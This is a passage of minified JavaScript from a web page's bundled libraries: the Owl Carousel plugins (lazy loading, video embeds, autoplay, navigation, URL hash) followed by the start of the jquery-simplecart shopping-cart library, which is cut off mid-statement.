for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.AutoRefresh=AutoRefresh;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var Lazy=function(carousel){this._core=carousel;this._loaded=[];this._handlers={'initialized.owl.carousel change.owl.carousel resized.owl.carousel':$.proxy(function(e){if(!e.namespace){return;}
if(!this._core.settings||!this._core.settings.lazyLoad){return;}
if((e.property&&e.property.name=='position')||e.type=='initialized'){var settings=this._core.settings,n=(settings.center&&Math.ceil(settings.items / 2)||settings.items),i=((settings.center&&n*-1)||0),position=(e.property&&e.property.value!==undefined?e.property.value:this._core.current())+i,clones=this._core.clones().length,load=$.proxy(function(i,v){this.load(v)},this);while(i++<n){this.load(clones / 2+this._core.relative(position));clones&&$.each(this._core.clones(this._core.relative(position)),load);position++;}}},this)};this._core.options=$.extend({},Lazy.Defaults,this._core.options);this._core.$element.on(this._handlers);};Lazy.Defaults={lazyLoad:false};Lazy.prototype.load=function(position){var $item=this._core.$stage.children().eq(position),$elements=$item&&$item.find('.owl-lazy');if(!$elements||$.inArray($item.get(0),this._loaded)>-1){return;}
$elements.each($.proxy(function(index,element){var $element=$(element),image,url=(window.devicePixelRatio>1&&$element.attr('data-src-retina'))||$element.attr('data-src');this._core.trigger('load',{element:$element,url:url},'lazy');if($element.is('img')){$element.one('load.owl.lazy',$.proxy(function(){$element.css('opacity',1);this._core.trigger('loaded',{element:$element,url:url},'lazy');},this)).attr('src',url);}else{image=new Image();image.onload=$.proxy(function(){$element.css({'background-image':'url("'+url+'")','opacity':'1'});this._core.trigger('loaded',{element:$element,url:url},'lazy');},this);image.src=url;}},this));this._loaded.push($item.get(0));};Lazy.prototype.destroy=function(){var handler,property;for(handler in this.handlers){this._core.$element.off(handler,this.handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.Lazy=Lazy;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var AutoHeight=function(carousel){this._core=carousel;this._handlers={'initialized.owl.carousel refreshed.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.autoHeight){this.update();}},this),'changed.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.autoHeight&&e.property.name=='position'){this.update();}},this),'loaded.owl.lazy':$.proxy(function(e){if(e.namespace&&this._core.settings.autoHeight&&e.element.closest('.'+this._core.settings.itemClass).index()===this._core.current()){this.update();}},this)};this._core.options=$.extend({},AutoHeight.Defaults,this._core.options);this._core.$element.on(this._handlers);};AutoHeight.Defaults={autoHeight:false,autoHeightClass:'owl-height'};AutoHeight.prototype.update=function(){var start=this._core._current,end=start+this._core.settings.items,visible=this._core.$stage.children().toArray().slice(start,end),heights=[],maxheight=0;$.each(visible,function(index,item){heights.push($(item).height());});maxheight=Math.max.apply(null,heights);this._core.$stage.parent().height(maxheight).addClass(this._core.settings.autoHeightClass);};AutoHeight.prototype.destroy=function(){var handler,property;for(handler in this._handlers){this._core.$element.off(handler,this._handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.AutoHeight=AutoHeight;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var Video=function(carousel){this._core=carousel;this._videos={};this._playing=null;this._handlers={'initialized.owl.carousel':$.proxy(function(e){if(e.namespace){this._core.register({type:'state',name:'playing',tags:['interacting']});}},this),'resize.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.video&&this.isInFullScreen()){e.preventDefault();}},this),'refreshed.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.is('resizing')){this._core.$stage.find('.cloned .owl-video-frame').remove();}},this),'changed.owl.carousel':$.proxy(function(e){if(e.namespace&&e.property.name==='position'&&this._playing){this.stop();}},this),'prepared.owl.carousel':$.proxy(function(e){if(!e.namespace){return;}
var $element=$(e.content).find('.owl-video');if($element.length){$element.css('display','none');this.fetch($element,$(e.content));}},this)};this._core.options=$.extend({},Video.Defaults,this._core.options);this._core.$element.on(this._handlers);this._core.$element.on('click.owl.video','.owl-video-play-icon',$.proxy(function(e){this.play(e);},this));};Video.Defaults={video:false,videoHeight:false,videoWidth:false};Video.prototype.fetch=function(target,item){var type=(function(){if(target.attr('data-vimeo-id')){return'vimeo';}else if(target.attr('data-vzaar-id')){return'vzaar'}else{return'youtube';}})(),id=target.attr('data-vimeo-id')||target.attr('data-youtube-id')||target.attr('data-vzaar-id'),width=target.attr('data-width')||this._core.settings.videoWidth,height=target.attr('data-height')||this._core.settings.videoHeight,url=target.attr('href');if(url){id=url.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/);if(id[3].indexOf('youtu')>-1){type='youtube';}else if(id[3].indexOf('vimeo')>-1){type='vimeo';}else if(id[3].indexOf('vzaar')>-1){type='vzaar';}else{throw new Error('Video URL not supported.');}
id=id[6];}else{throw new Error('Missing video URL.');}
this._videos[url]={type:type,id:id,width:width,height:height};item.attr('data-video',url);this.thumbnail(target,this._videos[url]);};Video.prototype.thumbnail=function(target,video){var tnLink,icon,path,dimensions=video.width&&video.height?'style="width:'+video.width+'px;height:'+video.height+'px;"':'',customTn=target.find('img'),srcType='src',lazyClass='',settings=this._core.settings,create=function(path){icon='<div class="owl-video-play-icon"></div>';if(settings.lazyLoad){tnLink='<div class="owl-video-tn '+lazyClass+'" '+srcType+'="'+path+'"></div>';}else{tnLink='<div class="owl-video-tn" style="opacity:1;background-image:url('+path+')"></div>';}
target.after(tnLink);target.after(icon);};target.wrap('<div class="owl-video-wrapper"'+dimensions+'></div>');if(this._core.settings.lazyLoad){srcType='data-src';lazyClass='owl-lazy';}
if(customTn.length){create(customTn.attr(srcType));customTn.remove();return false;}
if(video.type==='youtube'){path="//img.youtube.com/vi/"+video.id+"/hqdefault.jpg";create(path);}else if(video.type==='vimeo'){$.ajax({type:'GET',url:'//vimeo.com/api/v2/video/'+video.id+'.json',jsonp:'callback',dataType:'jsonp',success:function(data){path=data[0].thumbnail_large;create(path);}});}else if(video.type==='vzaar'){$.ajax({type:'GET',url:'//vzaar.com/api/videos/'+video.id+'.json',jsonp:'callback',dataType:'jsonp',success:function(data){path=data.framegrab_url;create(path);}});}};Video.prototype.stop=function(){this._core.trigger('stop',null,'video');this._playing.find('.owl-video-frame').remove();this._playing.removeClass('owl-video-playing');this._playing=null;this._core.leave('playing');this._core.trigger('stopped',null,'video');};Video.prototype.play=function(event){var target=$(event.target),item=target.closest('.'+this._core.settings.itemClass),video=this._videos[item.attr('data-video')],width=video.width||'100%',height=video.height||this._core.$stage.height(),html;if(this._playing){return;}
this._core.enter('playing');this._core.trigger('play',null,'video');item=this._core.items(this._core.relative(item.index()));this._core.reset(item.index());if(video.type==='youtube'){html='<iframe width="'+width+'" height="'+height+'" src="//www.youtube.com/embed/'+
video.id+'?autoplay=1&rel=0&v='+video.id+'" frameborder="0" allowfullscreen></iframe>';}else if(video.type==='vimeo'){html='<iframe src="//player.vimeo.com/video/'+video.id+'?autoplay=1" width="'+width+'" height="'+height+'" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>';}else if(video.type==='vzaar'){html='<iframe frameborder="0"'+'height="'+height+'"'+'width="'+width+'" allowfullscreen mozallowfullscreen webkitAllowFullScreen '+'src="//view.vzaar.com/'+video.id+'/player?autoplay=true"></iframe>';}
$('<div class="owl-video-frame">'+html+'</div>').insertAfter(item.find('.owl-video'));this._playing=item.addClass('owl-video-playing');};Video.prototype.isInFullScreen=function(){var element=document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement;return element&&$(element).parent().hasClass('owl-video-frame');};Video.prototype.destroy=function(){var handler,property;this._core.$element.off('click.owl.video');for(handler in this._handlers){this._core.$element.off(handler,this._handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.Video=Video;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var Animate=function(scope){this.core=scope;this.core.options=$.extend({},Animate.Defaults,this.core.options);this.swapping=true;this.previous=undefined;this.next=undefined;this.handlers={'change.owl.carousel':$.proxy(function(e){if(e.namespace&&e.property.name=='position'){this.previous=this.core.current();this.next=e.property.value;}},this),'drag.owl.carousel dragged.owl.carousel translated.owl.carousel':$.proxy(function(e){if(e.namespace){this.swapping=e.type=='translated';}},this),'translate.owl.carousel':$.proxy(function(e){if(e.namespace&&this.swapping&&(this.core.options.animateOut||this.core.options.animateIn)){this.swap();}},this)};this.core.$element.on(this.handlers);};Animate.Defaults={animateOut:false,animateIn:false};Animate.prototype.swap=function(){if(this.core.settings.items!==1){return;}
if(!$.support.animation||!$.support.transition){return;}
this.core.speed(0);var left,clear=$.proxy(this.clear,this),previous=this.core.$stage.children().eq(this.previous),next=this.core.$stage.children().eq(this.next),incoming=this.core.settings.animateIn,outgoing=this.core.settings.animateOut;if(this.core.current()===this.previous){return;}
if(outgoing){left=this.core.coordinates(this.previous)-this.core.coordinates(this.next);previous.one($.support.animation.end,clear).css({'left':left+'px'}).addClass('animated owl-animated-out').addClass(outgoing);}
if(incoming){next.one($.support.animation.end,clear).addClass('animated owl-animated-in').addClass(incoming);}};Animate.prototype.clear=function(e){$(e.target).css({'left':''}).removeClass('animated owl-animated-out owl-animated-in').removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut);this.core.onTransitionEnd();};Animate.prototype.destroy=function(){var handler,property;for(handler in this.handlers){this.core.$element.off(handler,this.handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.Animate=Animate;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var Autoplay=function(carousel){this._core=carousel;this._timeout=null;this._paused=false;this._handlers={'changed.owl.carousel':$.proxy(function(e){if(e.namespace&&e.property.name==='settings'){if(this._core.settings.autoplay){this.play();}else{this.stop();}}else if(e.namespace&&e.property.name==='position'){if(this._core.settings.autoplay){this._setAutoPlayInterval();}}},this),'initialized.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.autoplay){this.play();}},this),'play.owl.autoplay':$.proxy(function(e,t,s){if(e.namespace){this.play(t,s);}},this),'stop.owl.autoplay':$.proxy(function(e){if(e.namespace){this.stop();}},this),'mouseover.owl.autoplay':$.proxy(function(){if(this._core.settings.autoplayHoverPause&&this._core.is('rotating')){this.pause();}},this),'mouseleave.owl.autoplay':$.proxy(function(){if(this._core.settings.autoplayHoverPause&&this._core.is('rotating')){this.play();}},this),'touchstart.owl.core':$.proxy(function(){if(this._core.settings.autoplayHoverPause&&this._core.is('rotating')){this.pause();}},this),'touchend.owl.core':$.proxy(function(){if(this._core.settings.autoplayHoverPause){this.play();}},this)};this._core.$element.on(this._handlers);this._core.options=$.extend({},Autoplay.Defaults,this._core.options);};Autoplay.Defaults={autoplay:false,autoplayTimeout:5000,autoplayHoverPause:false,autoplaySpeed:false};Autoplay.prototype.play=function(timeout,speed){this._paused=false;if(this._core.is('rotating')){return;}
this._core.enter('rotating');this._setAutoPlayInterval();};Autoplay.prototype._getNextTimeout=function(timeout,speed){if(this._timeout){window.clearTimeout(this._timeout);}
return window.setTimeout($.proxy(function(){if(this._paused||this._core.is('busy')||this._core.is('interacting')||document.hidden){return;}
this._core.next(speed||this._core.settings.autoplaySpeed);},this),timeout||this._core.settings.autoplayTimeout);};Autoplay.prototype._setAutoPlayInterval=function(){this._timeout=this._getNextTimeout();};Autoplay.prototype.stop=function(){if(!this._core.is('rotating')){return;}
window.clearTimeout(this._timeout);this._core.leave('rotating');};Autoplay.prototype.pause=function(){if(!this._core.is('rotating')){return;}
this._paused=true;};Autoplay.prototype.destroy=function(){var handler,property;this.stop();for(handler in this._handlers){this._core.$element.off(handler,this._handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.autoplay=Autoplay;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){'use strict';var Navigation=function(carousel){this._core=carousel;this._initialized=false;this._pages=[];this._controls={};this._templates=[];this.$element=this._core.$element;this._overrides={next:this._core.next,prev:this._core.prev,to:this._core.to};this._handlers={'prepared.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.dotsData){this._templates.push('<div class="'+this._core.settings.dotClass+'">'+
$(e.content).find('[data-dot]').addBack('[data-dot]').attr('data-dot')+'</div>');}},this),'added.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.dotsData){this._templates.splice(e.position,0,this._templates.pop());}},this),'remove.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.dotsData){this._templates.splice(e.position,1);}},this),'changed.owl.carousel':$.proxy(function(e){if(e.namespace&&e.property.name=='position'){this.draw();}},this),'initialized.owl.carousel':$.proxy(function(e){if(e.namespace&&!this._initialized){this._core.trigger('initialize',null,'navigation');this.initialize();this.update();this.draw();this._initialized=true;this._core.trigger('initialized',null,'navigation');}},this),'refreshed.owl.carousel':$.proxy(function(e){if(e.namespace&&this._initialized){this._core.trigger('refresh',null,'navigation');this.update();this.draw();this._core.trigger('refreshed',null,'navigation');}},this)};this._core.options=$.extend({},Navigation.Defaults,this._core.options);this.$element.on(this._handlers);};Navigation.Defaults={nav:false,navText:['prev','next'],navSpeed:false,navElement:'div',navContainer:false,navContainerClass:'owl-nav',navClass:['owl-prev','owl-next'],slideBy:1,dotClass:'owl-dot',dotsClass:'owl-dots',dots:true,dotsEach:false,dotsData:false,dotsSpeed:false,dotsContainer:false};Navigation.prototype.initialize=function(){var override,settings=this._core.settings;this._controls.$relative=(settings.navContainer?$(settings.navContainer):$('<div>').addClass(settings.navContainerClass).appendTo(this.$element)).addClass('disabled');this._controls.$previous=$('<'+settings.navElement+'>').addClass(settings.navClass[0]).html(settings.navText[0]).prependTo(this._controls.$relative).on('click',$.proxy(function(e){this.prev(settings.navSpeed);},this));this._controls.$next=$('<'+settings.navElement+'>').addClass(settings.navClass[1]).html(settings.navText[1]).appendTo(this._controls.$relative).on('click',$.proxy(function(e){this.next(settings.navSpeed);},this));if(!settings.dotsData){this._templates=[$('<div>').addClass(settings.dotClass).append($('<span>')).prop('outerHTML')];}
this._controls.$absolute=(settings.dotsContainer?$(settings.dotsContainer):$('<div>').addClass(settings.dotsClass).appendTo(this.$element)).addClass('disabled');this._controls.$absolute.on('click','div',$.proxy(function(e){var index=$(e.target).parent().is(this._controls.$absolute)?$(e.target).index():$(e.target).parent().index();e.preventDefault();this.to(index,settings.dotsSpeed);},this));for(override in this._overrides){this._core[override]=$.proxy(this[override],this);}};Navigation.prototype.destroy=function(){var handler,control,property,override;for(handler in this._handlers){this.$element.off(handler,this._handlers[handler]);}
for(control in this._controls){this._controls[control].remove();}
for(override in this.overides){this._core[override]=this._overrides[override];}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};Navigation.prototype.update=function(){var i,j,k,lower=this._core.clones().length / 2,upper=lower+this._core.items().length,maximum=this._core.maximum(true),settings=this._core.settings,size=settings.center||settings.autoWidth||settings.dotsData?1:settings.dotsEach||settings.items;if(settings.slideBy!=='page'){settings.slideBy=Math.min(settings.slideBy,settings.items);}
if(settings.dots||settings.slideBy=='page'){this._pages=[];for(i=lower,j=0,k=0;i<upper;i++){if(j>=size||j===0){this._pages.push({start:Math.min(maximum,i-lower),end:i-lower+size-1});if(Math.min(maximum,i-lower)===maximum){break;}
j=0,++k;}
j+=this._core.mergers(this._core.relative(i));}}};Navigation.prototype.draw=function(){var difference,settings=this._core.settings,disabled=this._core.items().length<=settings.items,index=this._core.relative(this._core.current()),loop=settings.loop||settings.rewind;this._controls.$relative.toggleClass('disabled',!settings.nav||disabled);if(settings.nav){this._controls.$previous.toggleClass('disabled',!loop&&index<=this._core.minimum(true));this._controls.$next.toggleClass('disabled',!loop&&index>=this._core.maximum(true));}
this._controls.$absolute.toggleClass('disabled',!settings.dots||disabled);if(settings.dots){difference=this._pages.length-this._controls.$absolute.children().length;if(settings.dotsData&&difference!==0){this._controls.$absolute.html(this._templates.join(''));}else if(difference>0){this._controls.$absolute.append(new Array(difference+1).join(this._templates[0]));}else if(difference<0){this._controls.$absolute.children().slice(difference).remove();}
this._controls.$absolute.find('.active').removeClass('active');this._controls.$absolute.children().eq($.inArray(this.current(),this._pages)).addClass('active');}};Navigation.prototype.onTrigger=function(event){var settings=this._core.settings;event.page={index:$.inArray(this.current(),this._pages),count:this._pages.length,size:settings&&(settings.center||settings.autoWidth||settings.dotsData?1:settings.dotsEach||settings.items)};};Navigation.prototype.current=function(){var current=this._core.relative(this._core.current());return $.grep(this._pages,$.proxy(function(page,index){return page.start<=current&&page.end>=current;},this)).pop();};Navigation.prototype.getPosition=function(successor){var position,length,settings=this._core.settings;if(settings.slideBy=='page'){position=$.inArray(this.current(),this._pages);length=this._pages.length;successor?++position:--position;position=this._pages[((position%length)+length)%length].start;}else{position=this._core.relative(this._core.current());length=this._core.items().length;successor?position+=settings.slideBy:position-=settings.slideBy;}
return position;};Navigation.prototype.next=function(speed){$.proxy(this._overrides.to,this._core)(this.getPosition(true),speed);};Navigation.prototype.prev=function(speed){$.proxy(this._overrides.to,this._core)(this.getPosition(false),speed);};Navigation.prototype.to=function(position,speed,standard){var length;if(!standard&&this._pages.length){length=this._pages.length;$.proxy(this._overrides.to,this._core)(this._pages[((position%length)+length)%length].start,speed);}else{$.proxy(this._overrides.to,this._core)(position,speed);}};$.fn.owlCarousel.Constructor.Plugins.Navigation=Navigation;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){'use strict';var Hash=function(carousel){this._core=carousel;this._hashes={};this.$element=this._core.$element;this._handlers={'initialized.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.startPosition==='URLHash'){$(window).trigger('hashchange.owl.navigation');}},this),'prepared.owl.carousel':$.proxy(function(e){if(e.namespace){var hash=$(e.content).find('[data-hash]').addBack('[data-hash]').attr('data-hash');if(!hash){return;}
this._hashes[hash]=e.content;}},this),'changed.owl.carousel':$.proxy(function(e){if(e.namespace&&e.property.name==='position'){var current=this._core.items(this._core.relative(this._core.current())),hash=$.map(this._hashes,function(item,hash){return item===current?hash:null;}).join();if(!hash||window.location.hash.slice(1)===hash){return;}
window.location.hash=hash;}},this)};this._core.options=$.extend({},Hash.Defaults,this._core.options);this.$element.on(this._handlers);$(window).on('hashchange.owl.navigation',$.proxy(function(e){var hash=window.location.hash.substring(1),items=this._core.$stage.children(),position=this._hashes[hash]&&items.index(this._hashes[hash]);if(position===undefined||position===this._core.current()){return;}
this._core.to(this._core.relative(position),false,true);},this));};Hash.Defaults={URLhashListener:false};Hash.prototype.destroy=function(){var handler,property;$(window).off('hashchange.owl.navigation');for(handler in this._handlers){this._core.$element.off(handler,this._handlers[handler]);}
for(property in Object.getOwnPropertyNames(this)){typeof this[property]!='function'&&(this[property]=null);}};$.fn.owlCarousel.Constructor.Plugins.Hash=Hash;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var style=$('<support>').get(0).style,prefixes='Webkit Moz O ms'.split(' '),events={transition:{end:{WebkitTransition:'webkitTransitionEnd',MozTransition:'transitionend',OTransition:'oTransitionEnd',transition:'transitionend'}},animation:{end:{WebkitAnimation:'webkitAnimationEnd',MozAnimation:'animationend',OAnimation:'oAnimationEnd',animation:'animationend'}}},tests={csstransforms:function(){return!!test('transform');},csstransforms3d:function(){return!!test('perspective');},csstransitions:function(){return!!test('transition');},cssanimations:function(){return!!test('animation');}};function test(property,prefixed){var result=false,upper=property.charAt(0).toUpperCase()+property.slice(1);$.each((property+' '+prefixes.join(upper+' ')+upper).split(' '),function(i,property){if(style[property]!==undefined){result=prefixed?property:true;return false;}});return result;}
function prefixed(property){return test(property,true);}
if(tests.csstransitions()){$.support.transition=new String(prefixed('transition'))
$.support.transition.end=events.transition.end[$.support.transition];}
if(tests.cssanimations()){$.support.animation=new String(prefixed('animation'))
$.support.animation.end=events.animation.end[$.support.animation];}
if(tests.csstransforms()){$.support.transform=new String(prefixed('transform'));$.support.transform3d=tests.csstransforms3d();}})(window.Zepto||window.jQuery,window,document);

/*
* jquery-simplecart 
* License MIT
*/
(function(p,f){var s="string",k=function(e,f){return typeof e===f},e=function(e){return k(e,"undefined")},h=function(e){return k(e,"function")},y=function(e){return"object"===typeof HTMLElement?e instanceof HTMLElement:"object"===typeof e&&1===e.nodeType&&"string"===typeof e.nodeName},C=function(q){function E(a){return b.extend({attr:"",label:"",view:"attr",text:"",className:"",hide:!1},a||{})}function F(){if(!b.isReady){try{f.documentElement.doScroll("left")}catch(a){setTimeout(F,1);return}b.init()}}
var t={MooTools:"$$",Prototype:"$$",jQuery:"*"},n=0,r={},x=q||"simpleCart",z={};q={};q={};var v=p.localStorage,l=p.console||{msgs:[],log:function(a){l.msgs.push(a)}},D={USD:{code:"USD",symbol:"&#36;",name:"US Dollar"},AUD:{code:"AUD",symbol:"&#36;",name:"Australian Dollar"},BRL:{code:"BRL",symbol:"R&#36;",name:"Brazilian Real"},CAD:{code:"CAD",symbol:"&#36;",name:"Canadian Dollar"},CZK:{code:"CZK",symbol:"&nbsp;&#75;&#269;",name:"Czech Koruna",after:!0},DKK:{code:"DKK",symbol:"DKK&nbsp;",name:"Danish Krone"},
EUR:{code:"EUR",symbol:"&euro;",name:"Euro"},HKD:{code:"HKD",symbol:"&#36;",name:"Hong Kong Dollar"},HUF:{code:"HUF",symbol:"&#70;&#116;",name:"Hungarian Forint"},ILS:{code:"ILS",symbol:"&#8362;",name:"Israeli New Sheqel"},JPY:{code:"JPY",symbol:"&yen;",name:"Japanese Yen",accuracy:0},MXN:{code:"MXN",symbol:"&#36;",name:"Mexican Peso"},NOK:{code:"NOK",symbol:"NOK&nbsp;",name:"Norwegian Krone"},NZD:{code:"NZD",symbol:"&#36;",name:"New Zealand Dollar"},PLN:{code:"PLN",symbol:"PLN&nbsp;",name:"Polish Zloty"},
GBP:{code:"GBP",symbol:"&pound;",name:"Pound Sterling"},SGD:{code:"SGD",symbol:"&#36;",name:"Singapore Dollar"},SEK:{code:"SEK",symbol:"SEK&nbsp;",name:"Swedish Krona"},CHF:{code:"CHF",symbol:"CHF&nbsp;",name:"Swiss Franc"},THB:{code:"THB",symbol:"&#3647;",name:"Thai Baht"},BTC:{code:"BTC",symbol:" BTC",name:"Bitcoin",accuracy:4,after:!0}},m={checkout:{type:"PayPal",email:"you@yours.com"},currency:"USD",language:"english-us",cartStyle:"div",cartColumns:[{attr:"name",label:"Name"},{attr:"price",label:"Price",
view:"currency"},{view:"decrement",label:!1},{attr:"quantity",label:"Qty"},{view:"increment",label:!1},{attr:"total",label:"SubTotal",view:"currency"},{view:"remove",text:"Remove",label:!1}],excludeFromCheckout:["thumb"],shippingFlatRate:0,shippingQuantityRate:0,shippingTotalRate:0,shippingCustom:null,taxRate:0,taxShipping:!1,data:{}},b=function(a){if(h(a))return b.ready(a);if(k(a,"object"))return b.extend(m,a)},A,B;b.extend=function(a,d){var c;e(d)&&(d=a,a=b);for(c in d)Object.prototype.hasOwnProperty.call(d,
c)&&(a[c]=d[c]);return a};b.extend({copy:function(a){a=C(a);a.init();return a}});b.extend({isReady:!1,add:function(a,d){var c=new b.Item(a||{}),g=!0,u=!0===d?d:!1;if(!u&&(g=b.trigger("beforeAdd",[c]),!1===g))return!1;(g=b.has(c))?(g.increment(c.quantity()),c=g):r[c.id()]=c;b.update();u||b.trigger("afterAdd",[c,e(g)]);return c},each:function(a,d){var c,g=0,u,e,w;if(h(a))e=a,w=r;else if(h(d))e=d,w=a;else return;for(c in w)if(Object.prototype.hasOwnProperty.call(w,c)){u=e.call(b,w[c],g,c);if(!1===u)break;
g+=1}},find:function(a){var d=[];if(k(r[a],"object"))return r[a];if(k(a,"object"))return b.each(function(c){var g=!0;b.each(a,function(a,b,d){k(a,s)?a.match(/<=.*/)?(a=parseFloat(a.replace("<=","")),c.get(d)&&parseFloat(c.get(d))<=a||(g=!1)):a.match(/</)?(a=parseFloat(a.replace("<","")),c.get(d)&&parseFloat(c.get(d))<a||(g=!1)):a.match(/>=/)?(a=parseFloat(a.replace(">=","")),c.get(d)&&parseFloat(c.get(d))>=a||(g=!1)):a.match(/>/)?(a=parseFloat(a.replace(">","")),c.get(d)&&parseFloat(c.get(d))>a||
(g=!1)):c.get(d)&&c.get(d)===a||(g=!1):c.get(d)&&c.get(d)===a||(g=!1);return g});g&&d.push(c)}),d;e(a)&&b.each(function(a){d.push(a)});return d},items:function(){return this.find()},has:function(a){var d=!1;b.each(function(b){b.equals(a)&&(d=b)});return d},empty:function(){var a={};b.each(function(b){!1===b.remove(!0)&&(a[b.id()]=b)});r=a;b.update()},quantity:function(){var a=0;b.each(function(b){a+=b.quantity()});return a},total:function(){var a=0;b.each(function(b){a+=b.total()});return a},grandTotal:function(){return b.total()+
b.tax()+b.shipping()},update:function(){b.save();b.trigger("update")},init:function(){b.load();b.update();b.ready()},$:function(a){return new b.ELEMENT(a)},$create:function(a){return b.$(f.createElement(a))},setupViewTool:function(){var a,d=p,c;for(c in t)if(Object.prototype.hasOwnProperty.call(t,c)&&p[c]&&(a=t[c].replace("*",c).split("."),(a=a.shift())&&(d=d[a]),"function"===typeof d)){A=d;b.extend(b.ELEMENT._,z[c]);break}},ids:function(){var a=[];b.each(function(b){a.push(b.id())});return a},save:function(){b.trigger("beforeSave");
var a={};b.each(function(d){a[d.id()]=b.extend(d.fields(),d.options())});v.setItem(x+"_items",JSON.stringify(a));b.trigger("afterSave")},load:function(){r={};var a=v.getItem(x+"_items");if(a){try{b.each(JSON.parse(a),function(a){b.add(a,!0)})}catch(d){b.error("Error Loading data: "+d)}b.trigger("load")}},ready:function(a){h(a)?b.isReady?a.call(b):b.bind("ready",a):e(a)&&!b.isReady&&(b.trigger("ready"),b.isReady=!0)},error:function(a){var d="";k(a,s)?d=a:k(a,"object")&&k(a.message,s)&&(d=a.message);
try{l.log("simpleCart(js) Error: "+d)}catch(c){}b.trigger("error",a)}});b.extend({tax:function(){var a=m.taxShipping?b.total()+b.shipping():b.total(),d=b.taxRate()*a;b.each(function(a){a.get("tax")?d+=a.get("tax"):a.get("taxRate")&&(d+=a.get("taxRate")*a.total())});return parseFloat(d)},taxRate:function(){return m.taxRate||0},shipping:function(a){if(h(a))b({shippingCustom:a});else{var d=m.shippingQuantityRate*b.quantity()+m.shippingTotalRate*b.total()+m.shippingFlatRate;h(m.shippingCustom)&&(d+=m.shippingCustom.call(b));
b.each(function(a){d+=parseFloat(a.get("shipping")||0)});return parseFloat(d)}}});B={attr:function(a,b){return a.get(b.attr)||""},currency:function(a,d){return b.toCurrency(a.get(d.attr)||0)},link:function(a,b){return"<a href='"+a.get(b.attr)+"'>"+b.text+"</a>"},decrement:function(a,b){return"<a href='javascript:;' class='"+x+"_decrement'>"+(b.text||"-")+"</a>"},increment:function(a,b){return"<a href='javascript:;' class='"+x+"_increment'>"+(b.text||"+")+"</a>"},image:function(a,b){return"<img src='"+
a.get(b.attr)+"'/>"},input:function(a,b){return"<input type='text' value='"+a.get(b.attr)+"' class='"+x+"_input'/>"},remove:function(a,b){return"<a href='javascript:;' class='"+x+"_remove'>"+(b.text||"X")+"</a>"}};b.extend({writeCart:function(a){var d=m.cartStyle.toLowerCase(),c="table"===d,g=c?"tr":"div",u=c?"th":"div",e=c?"td":"div",w=b.$create(d),d=b.$create(g).addClass("headerRow"),f,h;b.$(a).html(" ").append(w);w.append(d);c=0;for(h=m.cartColumns.length;c<h;c+=1)f=E(m.cartColumns[c]),a="item-"+
(f.attr||f.view||f.label||f.text||"cell")+" "+f.className,f=f.label||"",d.append(b.$create(u).addClass(a).html(f));b.each(function(a,d){b.createCartRow(a,d,g,e,w)});return w},createCartRow:function(a,d,c,g,u){d=b.$create(c).addClass("itemRow row-"+d+" "+(d%2?"even":"odd")).attr("id","cartItem_"+a.id());var e,f,l;u.append(d);u=0;for(c=m.cartColumns.length;u<c;u+=1)e=E(m.cartColumns[u]),f="item-"+(e.attr||(k(e.view,s)?e.view:e.label||e.text||"cell"))+" "+e.className,l=a,l=(h(e.view)?e.view:k(e.view,
s)&&h(B[e.view])?B[e.view]:B.attr).call(b,l,e),f=b.$create(g).addClass(f).html(l),d.append(f);return d}});b.Item=function(a){function d(){k(c.price,s)&&(c.price=parseFloat(c.price.replace(b.currency().decimal,".").replace(/[^0-9\.]+/ig,"")));isNaN(c.price)&&(c.price=0);0>c.price&&(c.price=0);k(c.quantity,s)&&(c.quantity=parseInt(c.quantity.replace(b.currency().delimiter,""),10));isNaN(c.quantity)&&(c.quantity=1);0>=c.quantity&&g.remove()}var c={},g=this;k(a,"object")&&b.extend(c,a);n+=1;for(c.id=
